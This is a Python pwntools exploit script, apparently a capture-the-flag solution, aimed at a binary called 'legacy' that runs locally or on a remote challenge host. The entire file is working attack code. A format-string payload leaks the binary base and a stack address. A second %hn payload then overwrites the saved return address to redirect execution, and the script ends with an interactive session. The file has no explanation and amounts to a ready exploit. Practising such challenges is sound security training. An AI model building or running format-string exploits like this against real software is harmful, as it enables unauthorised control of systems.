#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('legacy', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x56555b5a

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('node-1.mcsc.space', 12731)
else:
    p = process([exe.path])
GDB()

sla(b'> ', b'maint a %217$p%216$p')
# 115
# + 56
# sla(b'> ', b'STATUS')

p.recvuntil(b' | Auth: ')

leak = p.recvline()[:-1].split(b'0x')

binary = int(leak[1], 16)
exe.address = binary - 0xf06
stack = int(leak[2], 16)
rip = stack - 0x22c

info(f"binary leak: {hex(binary)}")
info(f"binary base: {hex(exe.address)}")

info(f'stack leak: {hex(stack)}')

fake = exe.address + 0xC9F

load = flat(
    b'maint a ',
    f'%{ (fake & 0xffff) }c%138$hn'.encode().ljust(20, b'A'),
    rip
)
# 0x56555c9f
    
sla(b'> ', load)


p.interactive()
